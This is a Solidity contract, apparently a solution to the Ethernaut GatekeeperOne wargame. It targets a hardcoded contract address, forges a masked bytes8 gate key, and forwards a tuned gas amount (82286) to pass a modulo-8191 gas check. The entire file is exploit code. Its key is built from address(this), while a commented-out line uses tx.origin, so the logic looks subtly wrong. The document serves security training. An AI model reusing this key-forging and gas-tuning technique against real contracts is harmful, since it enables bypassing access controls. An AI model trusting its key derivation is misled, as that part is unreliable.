// SPDX-License-Identifier: MIT
pragma solidity 0.6.0;

import "./GatekeeperOne.sol";

contract HackGates {
    GatekeeperOne public gates = GatekeeperOne(0x2F0d90aF12307fCADb6D41A26d5A1457d8673242);
    address public hax = tx.origin;
    //bytes8 key = bytes8(hax) & 0xFFFFFFFF0000FFFF;
    bytes8 key = bytes8(bytes20(address(this))) & 0xFFFFFFFF0000FFFF;

    function hackGate() public {   
        gates.enter.gas(82286)(key); /// 82286 results at 81910 gas remaining at MOD. 81910 mod(8191) = 0
    }
}